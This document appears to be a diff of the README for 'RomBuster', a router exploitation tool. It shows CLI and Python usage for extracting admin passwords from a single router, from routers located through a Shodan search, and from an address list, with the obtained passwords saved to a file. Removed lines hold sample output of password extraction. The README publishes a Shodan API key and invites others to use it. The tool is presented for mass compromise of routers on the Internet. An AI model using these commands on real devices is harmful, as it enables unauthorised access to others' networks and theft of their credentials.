@@ -38,52 +38,25 @@ optional arguments:
 
 ### Examples
 
+**Exploiting single router**
+
 Let's hack my router just for fun.
 
 ```shell
-rombuster -a 192.168.2.1
+rombuster -a 192.168.99.1
 ```
 
-**output:**
+**Exploiting routers from Internet**
+
+Let's try to use Shodan search engine to exploit routers over Internet, we will use it with `-t` for fast exploitation.
 
 ```shell
-[*] (192.168.2.1) - connecting to router...
-[*] (192.168.2.1) - accessing router rom...
-[*] (192.168.2.1) - extracting admin password...
-[i] (192.168.2.1) - password: SuperHardPassword999
-```
-
-Let's try to use Shodan search engine to exploit routers over Internet and save all obtained passwords to `passwords.txt`, we will use it with `-t` for fast exploitation.
-
-```shell
-rombuster -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
+rombuster -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD
 ```
 
 **NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)
 
-**output:**
-
-```shell
-[*] Authorizing Shodan by given API key...
-[+] Authorization successfully completed!
-[*] Initializing thread #0...
-[*] (x.x.x.x) - connecting to router...
-[*] Initializing thread #1...
-[*] (x.x.x.x) - connecting to router...
-[*] Initializing thread #2...
-[*] (x.x.x.x) - connecting to router...
-[*] (x.x.x.x) - accessing router rom...
-[*] (x.x.x.x) - extracting admin password...
-[i] Thread #0 completed.
-[*] (x.x.x.x) - connecting to router...
-[*] (x.x.x.x) - accessing router rom...
-[*] (x.x.x.x) - extracting admin password...
-[i] Thread #1 completed.
-[*] (x.x.x.x) - connecting to router...
-[*] (x.x.x.x) - accessing router rom...
-[*] (x.x.x.x) - extracting admin password...
-[i] Thread #2 completed.
-```
+**Exploiting routers from input file**
 
 Let's try to use opened database of routers with `-t` for fast exploitation.
 
@@ -93,29 +66,7 @@ rombuster -t -i routers.txt -o passwords.txt
 
 **NOTE:** It will exploit all routers in `routers.txt` list by their addresses and save all obtained passwords to `passwords.txt`.
 
-**output:**
-
-```shell
-[*] Initializing thread #0...
-[*] (x.x.x.x) - connecting to router...
-[*] Initializing thread #1...
-[*] (x.x.x.x) - connecting to router...
-[*] Initializing thread #2...
-[*] (x.x.x.x) - connecting to router...
-[*] (x.x.x.x) - accessing router rom...
-[*] (x.x.x.x) - extracting admin password...
-[i] Thread #0 completed.
-[*] (x.x.x.x) - connecting to router...
-[*] (x.x.x.x) - accessing router rom...
-[*] (x.x.x.x) - extracting admin password...
-[i] Thread #1 completed.
-[*] (x.x.x.x) - connecting to router...
-[*] (x.x.x.x) - accessing router rom...
-[*] (x.x.x.x) - extracting admin password...
-[i] Thread #2 completed.
-```
-
-## RomBuster API
+## API usage
 
 RomBuster also has their own Python API that can be invoked by importing RomBuster to your code:
 
@@ -127,24 +78,19 @@ from rombuster import RomBuster
 
 There are all RomBuster basic functions that can be used to exploit specified router.
 
-* `connect(host)` - Connect specified router by network address.
-* `exploit(router)` - Exploit connected router.
+* `exploit(address)` - Exploit single router by given address.
 
 ### Examples
+
+**Exploiting single router**
 
 ```python
 from rombuster import RomBuster
 
 rombuster = RomBuster()
+creds = rombuster.exploit('192.168.99.100')
 
-router = rombuster.connect('192.168.2.1')
-print(rombuster.exploit(router))
-```
-
-**output:**
-
-```shell
-'SuperHardPassword999'
+print(creds)
 ```
 
 ## Other tools
